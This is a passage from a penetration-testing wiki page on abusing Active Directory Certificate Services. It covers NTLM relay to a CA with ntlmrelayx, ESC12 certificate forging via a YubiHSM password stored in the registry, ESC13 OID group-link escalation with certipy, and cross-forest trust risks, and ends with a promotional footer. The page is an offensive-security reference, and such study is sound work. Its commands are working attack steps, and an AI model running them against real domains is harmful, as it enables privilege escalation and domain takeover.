[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Note: For domain controllers, we must specify `-template` in DomainController.

Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".

If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.

This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.

In first, you need to obtain the CA certificate (this is public) and then:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.

## OID Group Link Abuse - ESC13

### Explanation

The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:

```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Abuse Scenario

Find a user permission it can use `certipy find` or `Certify.exe find /showAllPermissions`.

If `John` have have permission to enroll `VulnerableTemplate`, the user can inherit the privileges of `VulnerableGroup` group.

All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

The configuration for **cross-forest enrollment** is made relatively straightforward. The **root CA certificate** from the resource forest is **published to the account forests** by administrators, and the **enterprise CA** certificates from the resource forest are **added to the `NTAuthCertificates` and AIA containers in each account forest**. To clarify, this arrangement grants the **CA in the resource forest complete control** over all other forests for which it manages PKI. Should this CA be **compromised by attackers**, certificates for all users in both the resource and account forests could be **forged by them**, thereby breaking the security boundary of the forest.

### Enrollment Privileges Granted to Foreign Principals

In multi-forest environments, caution is required concerning Enterprise CAs that **publish certificate templates** which allow **Authenticated Users or foreign principals** (users/groups external to the forest to which the Enterprise CA belongs) **enrollment and edit rights**.\
Upon authentication across a trust, the **Authenticated Users SID** is added to the user’s token by AD. Thus, if a domain possesses an Enterprise CA with a template that **allows Authenticated Users enrollment rights**, a template could potentially be **enrolled in by a user from a different forest**. Likewise, if **enrollment rights are explicitly granted to a foreign principal by a template**, a **cross-forest access-control relationship is thereby created**, enabling a principal from one forest to **enroll in a template from another forest**.

Both scenarios lead to an **increase in the attack surface** from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional privileges in a foreign domain.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
